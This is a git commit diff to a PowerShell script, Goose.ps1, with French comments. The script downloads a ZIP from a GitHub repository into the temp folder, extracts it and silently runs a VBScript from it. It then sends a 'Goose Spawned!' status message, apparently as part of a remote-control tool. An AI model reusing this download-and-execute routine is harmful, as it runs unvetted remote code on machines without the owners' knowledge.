2545c9faba7e1498d0e9d0100f81b3d41b06305e
ertvg <simjkl@hotmail.fr>
2025-01-26 22:58:40 +0100

    Update Goose.ps1

--- Goose.ps1
+++ Goose.ps1
@@ -1,11 +1,27 @@
 Function Goose {
-    $url = "https://github.com/ertvg/h/blob/main/Goose.zip"
+    $url = "https://github.com/ertvg/h/raw/main/Goose.zip"
     $tempFolder = $env:TMP
     $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
     $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
+    
+    # Téléchargement du fichier ZIP
     Invoke-WebRequest -Uri $url -OutFile $zipFile
-    Expand-Archive -Path $zipFile -DestinationPath $extractPath
+
+    # Extraction de l'archive ZIP
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+    
+    # Vérification de l'existence du fichier VBScript
     $vbscript = "$extractPath\Goose.vbs"
-    & $vbscript
-    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
+    If (Test-Path $vbscript) {
+        & $vbscript
+        sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"
+    } Else {
+        Write-Host "Erreur : Le fichier VBScript n'a pas été trouvé."
+    }
+}
+
+# Fonction sendMsg (si nécessaire)
+Function sendMsg {
+    param ($Message)
+    Write-Host $Message
 }
